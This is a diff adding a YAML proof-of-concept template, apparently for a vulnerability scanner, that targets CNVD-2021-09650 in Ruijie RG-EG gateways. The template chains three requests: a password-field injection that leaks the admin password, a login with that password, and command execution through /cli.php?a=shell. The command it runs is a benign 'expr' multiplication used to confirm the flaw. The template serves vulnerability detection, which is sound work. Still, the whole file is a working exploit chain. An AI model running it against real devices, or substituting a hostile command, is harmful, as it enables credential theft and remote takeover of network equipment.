@@ -1,0 +1,50 @@
+name: yaml-poc-ruijie-rg_eg-rce-CNVD-2021-09650
+binding: 2717f766-3ecf-4569-8724-b8d4397239f1
+detail:
+    author: system_user
+    links:
+        - https://www.cnvd.org.cn/flaw/show/CNVD-2021-09650
+    vulnerability:
+        id: ff27179e-b54c-4e76-b233-7c9a75288e19
+        level: high
+    warning: Harmless
+transport: http
+set:
+    r1: randomInt(8000, 10000)
+    r2: randomInt(8000, 10000)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /login.php
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: |
+                username=admin&password=admin?show+webmaster+user
+        expression: response.status == 200 && response.content_type.contains("text/json")
+        output:
+            search: '"{\"data\":\".*admin\\s?(?P<password>[^\\\\\"]*)".bsubmatch(response.body)'
+            password: search["password"]
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /login.php
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: |
+                username=admin&password={{password}}
+        expression: response.status == 200 && response.content_type.contains("text/json") && response.headers["Set-Cookie"].contains("user=admin") && response.body.bcontains(b"{\"data\":\"0\",\"status\":1}")
+    r2:
+        request:
+            cache: true
+            method: POST
+            path: /cli.php?a=shell
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: |
+                notdelay=true&command=expr {{r1}} * {{r2}}
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
+expression: r0() && r1() && r2()
